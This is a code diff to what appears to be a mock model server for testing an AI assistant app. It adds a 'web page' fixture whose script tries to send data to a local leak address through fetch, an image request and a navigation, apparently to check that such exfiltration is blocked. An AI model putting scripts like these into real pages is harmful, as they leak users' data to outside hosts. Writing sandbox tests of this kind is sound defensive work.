@@ -15,7 +15,8 @@
 // what's new when told the user is back. It sees pictures (a capture of the screen): it says how
 // big the last one is, read from its PNG header. It titles conversations with their first longer words.
 // It writes a "Word document" when asked for one, adds a step to it when asked to, and makes a
-// spreadsheet of a shared table's totals from a script (D119).
+// spreadsheet of a shared table's totals from a script (D119). Asked for a "web page", it writes one
+// whose script would send what it holds away, as an injected page would (D126), and an "SVG logo" as a drawing.
 // From 0.7 it makes a routine when asked for something "every" day or for a routine, at the time
 // asked, or else at the time Jean says requests of the kind were made.
 import { createServer } from 'node:http'
@@ -64,6 +65,14 @@ return { by, of, totals }`
 const spreadsheetScript = (name) => totalsScript(name).replace('return { by, of, totals }',
   "await tools.write({ name: 'Totals.xlsx', content: [[by, of], ...Object.entries(totals)].map((row) => row.join(',')).join('\\n') })\nreturn { by, of, totals }")
 const PLAN = '# Bakery plan\n\n1. Bake 120 croissants\n2. Deliver them\n\n| Day | Croissants |\n|---|---:|\n| Saturday | 120 |'
+/** A page with a style, and a script that tries every way out with what it holds: none may reach the leak address. */
+const PAGE = `<!doctype html><title>Bakery</title><style>h1 { color: rgb(180, 70, 20) }</style><h1>Bakery</h1><p id="out">Waiting</p>
+<a id="away" href="http://127.0.0.1:4182/leak?link">Away</a>
+<script>document.getElementById('out').textContent = 'Baked by a script'
+const leak = 'http://127.0.0.1:4182/leak?'
+fetch(leak + 'fetch').catch(() => {})
+new Image().src = leak + 'image'
+setTimeout(() => { location.href = leak + 'navigate' }, 200)</script>`
 
 /** A small PNG: a warm gradient. */
 function picture(width = 96, height = 64) {
@@ -206,6 +215,8 @@ createServer(async (req, res) => {
   else if (/\b(draw|picture)\b/i.test(question) && last.role === 'user' && declared.has('run')) call = { name: 'run', args: { code: `return await models.image(${JSON.stringify(question)})` } }
   else if (toolName === 'run' && /"shown":\s*true/.test(last.content)) answer = 'Here is your picture.'
   else if (/word document/i.test(question) && last.role === 'user' && declared.has('write')) call = { name: 'write', args: { name: 'Bakery plan.docx', content: PLAN } }
+  else if (/web page/i.test(question) && last.role === 'user' && declared.has('write')) call = { name: 'write', args: { name: 'Bakery.html', content: PAGE } }
+  else if (/svg logo/i.test(question) && last.role === 'user' && declared.has('write')) call = { name: 'write', args: { name: 'Logo.svg', content: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 120"><rect width="120" height="120" fill="#f6e7cf"/><circle cx="60" cy="60" r="38" fill="#c8691c"/></svg>' } }
   else if (/add a step/i.test(question) && last.role === 'user' && declared.has('edit')) call = { name: 'edit', args: { file: 'Bakery plan.docx', old: '2. Deliver them', new: '2. Deliver them\n3. Sell the rest' } }
   else if (toolName === 'write' || toolName === 'edit') answer = /^(?:Saved|Changed) /.test(last.content) ? `Done: **${/^(?:Saved|Changed) (.+?)\. /.exec(last.content)?.[1]}** is under this answer.` : `That didn't work: ${last.content}`
   else if (remember && last.role === 'user' && declared.has('remember')) call = { name: 'remember', args: { text: remember[1], scope: system.includes('<project>') ? 'project' : 'person' } }
